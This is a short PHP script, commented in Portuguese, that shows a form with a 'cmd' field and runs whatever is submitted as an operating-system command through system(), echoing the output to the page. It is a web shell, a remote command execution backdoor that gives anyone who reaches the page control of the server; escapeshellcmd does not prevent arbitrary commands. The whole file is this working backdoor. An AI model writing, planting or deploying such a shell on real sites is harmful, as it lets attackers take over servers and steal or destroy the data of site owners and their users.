<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cmd = escapeshellcmd($_POST['cmd']);

    echo "<pre>";

    $comando = system($cmd, $retorno); # executa comando no sistema operacional e retorna resultado
    
    echo "</pre>";
}


?>
<form method="post">
    
    <input type="text" name="cmd">
    <button type="submit"> Enviar </button>

</form>